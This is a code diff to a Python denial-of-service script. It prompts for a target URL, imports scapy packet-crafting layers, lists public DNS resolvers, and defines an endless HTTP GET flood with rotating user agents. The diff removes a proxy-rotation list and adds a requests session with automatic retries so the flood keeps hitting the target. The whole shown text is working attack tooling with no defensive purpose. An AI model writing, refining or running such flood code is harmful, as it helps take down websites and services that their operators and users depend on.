@@ -7,18 +7,12 @@ import threading
 from scapy.all import IP, UDP, DNS, send, ICMP, Raw, TCP
 from scapy.layers.inet import IP, UDP, TCP
 from scapy.layers.dns import DNS, DNSQR
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
 
 # Configuration
 target_url = input("Enter the target URL (e.g., https://www.example.com): ")
 target_domain = target_url.replace('https://', '').replace('http://', '').split('/')[0]
-proxies = [
-    'http://192.168.1.1:8080', 'http://192.168.1.2:8080', 'http://192.168.1.3:8080', 'http://192.168.1.4:8080', 'http://192.168.1.5:8080',
-    'http://192.168.1.6:8080', 'http://192.168.1.7:8080', 'http://192.168.1.8:8080', 'http://192.168.1.9:8080', 'http://192.168.1.10:8080',
-    'http://192.168.1.11:8080', 'http://192.168.1.12:8080', 'http://192.168.1.13:8080', 'http://192.168.1.14:8080', 'http://192.168.1.15:8080',
-    'http://192.168.1.16:8080', 'http://192.168.1.17:8080', 'http://192.168.1.18:8080', 'http://192.168.1.19:8080', 'http://192.168.1.20:8080',
-    'http://192.168.1.21:8080', 'http://192.168.1.22:8080', 'http://192.168.1.23:8080', 'http://192.168.1.24:8080', 'http://192.168.1.25:8080',
-    'http://192.168.1.26:8080', 'http://192.168.1.27:8080', 'http://192.168.1.28:8080', 'http://192.168.1.29:8080', 'http://192.168.1.30:8080'
-]
 dns_servers = [
     '8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222', '208.67.220.220', '8.8.4.4', '1.0.0.1', '9.9.9.10', '208.67.222.220', '208.67.220.222'
 ]
@@ -45,14 +39,19 @@ headers = [
     "Upgrade-Insecure-Requests: 1"
 ]
 
-# HTTP Flood with Proxy Rotation and Behavioral Mimicry
+# HTTP Flood without Proxy Rotation and Behavioral Mimicry
 def http_flood():
+    session = requests.Session()
+    retry = Retry(connect=3, backoff_factor=0.5)
+    adapter = HTTPAdapter(max_retries=retry)
+    session.mount('http://', adapter)
+    session.mount('https://', adapter)
+
     while True:
-        proxy = random.choice(proxies)
         user_agent = random.choice(user_agents)
         headers = {'User-Agent': user_agent}
         try:
-            response = requests.get(target_url, headers=headers, proxies={'http': proxy, 'https': proxy})
+            response = session.get(target_url, headers=headers)
             print(f'Status Code: {response.status_code}')
         except requests.exceptions.RequestException as e:
             print(f'Error: {e}')
